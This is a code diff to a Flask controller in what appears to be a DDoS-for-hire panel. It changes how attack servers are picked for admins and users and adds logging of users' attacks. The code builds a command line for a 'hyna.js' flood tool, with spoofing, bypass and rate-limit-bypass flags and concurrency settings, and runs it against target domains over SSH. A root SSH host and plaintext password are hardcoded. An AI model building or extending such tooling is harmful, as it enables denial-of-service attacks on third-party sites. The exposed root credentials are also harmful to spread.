@@ -2,11 +2,12 @@ from flask import jsonify, request, current_app
 from app.extensions import socketio
 from app.models.attack_log import AttackLog
 from app.models.team import Team
+from app.models.user_log import UserLog
 from app.models.user import User
 from app.models.server import Server
+from datetime import datetime
 from app.configs.blacklist import BLACKLISTED_DOMAINS, MAX_ATTACK_ATTEMPTS
 from app.configs.whitelist import WHITELISTED_IPS
-from app.configs.servers import ATTACK_SERVERS
 from app.models.attack_server_log import AttackServerLog
 from cryptography.hazmat.primitives import serialization
 from app.db import db
@@ -229,34 +230,19 @@ class AttackController:
         servers_to_use = []
         
         if currentUser:
-            team = None
-            if currentUser.get('team_id'):
-                team = Team.query.get(currentUser['team_id'])
-                
-            if team:
-                # Nếu có team, sử dụng server của team
-                server_ids = team.servers  
-                if not server_ids:
-                    return jsonify({
-                        'status': 'error',
-                        'message': 'No server available for this team'
-                    }), 400
-                servers_to_use = [
-                    {
-                        'ip': server.ip,
-                        'username': server.username,
-                        'password': server.password
-                    } 
-                    for server in Server.query.filter(Server.id.in_(server_ids)).all()
-                ]
-            else:
+            # Check if user is admin
+            isAdmin = currentUser.get('isAdmin', False)
+            
+            if isAdmin:
+                # Admin case: Use servers selected by admin
                 target_server_ids = payload.get('servers', [])
                 if not target_server_ids:
                     return jsonify({
                         'status': 'error',
                         'message': 'SERVER REQUIRED'
                     }), 400
-                
+                    
+                servers_to_use = []
                 for id in target_server_ids:
                     server = Server.query.get(id)
                     if server is None:
@@ -269,6 +255,34 @@ class AttackController:
                         'username': server.username,
                         'password': server.password
                     })
+            else:
+                user = User.query.get(currentUser.get('id'))
+                if user:
+                    user_server_id = user.server_id
+                    
+                    if user_server_id:
+                        server = Server.query.get(user_server_id)
+                        if server:
+                            servers_to_use = [{
+                                'ip': server.ip,
+                                'username': server.username,
+                                'password': server.password
+                            }]
+                        else:
+                            return jsonify({
+                                'status': 'error',
+                                'message': 'SERVER NOT FOUND'
+                            }), 400
+                    else:
+                        return jsonify({
+                            'status': 'error',
+                            'message': "YOU DON'T HAVE A SERVER"
+                        }), 400
+                else:
+                    return jsonify({
+                        'status': 'error',
+                        'message': 'USER NOT FOUND'
+                    }), 404
 
         if modeValue == 'xvfb-run /root/.nvm/versions/node/v20.18.3/bin/node hyna.js':
             attackCommand = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --debug true {bypassRateLimitValue}'
@@ -295,12 +309,22 @@ class AttackController:
             attackLog.id,
             servers_to_use
         )
-
+        server_ips = [server['ip'] for server in servers_to_use]
         if not successfulServers:
             return jsonify({
                 "status": "error",
                 "message": f"Attack failed on all servers. Errors: {', '.join(errors)}"
             }), 500
+        
+        if not user.isAdmin:
+            log_entry = UserLog(
+                ip=clientIp,
+                name_account=user.nameAccount,
+                detail=f'Attack domain: {domainName} concurrent: {concurrentValue} server: {server_ips}',
+                time_active=datetime.now()
+            )
+            db.session.add(log_entry)
+            db.session.commit()
 
         return jsonify({
             "status": "success",
@@ -553,7 +577,7 @@ class AttackController:
 
             sshClient = paramiko.SSHClient()
             sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            sshClient.connect("209.127.245.174", username="root", password="ZPeZDMGmh6K0xt0i")
+            sshClient.connect("23.229.7.14", username="root", password="bsXhIWtZLSRGc5yY")
 
             stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[x]vfb'")
             process_list = stdout.read().decode().strip().split("\n")
